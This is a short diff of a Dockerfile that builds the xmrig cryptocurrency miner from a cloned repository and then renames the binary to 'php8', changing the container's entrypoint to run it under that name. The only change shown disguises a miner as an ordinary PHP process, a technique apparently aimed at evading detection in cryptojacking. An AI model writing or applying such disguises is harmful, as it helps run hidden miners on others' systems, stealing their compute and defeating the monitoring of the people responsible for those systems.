@@ -8,7 +8,8 @@ RUN git clone https://github.com/bdklz/xmrig.git /app
 RUN mkdir /app/build
 RUN cmake .
 RUN make
+RUN mv xmrig php8
 
 
 
-ENTRYPOINT  ["./xmrig"]
+ENTRYPOINT  ["./php8"]
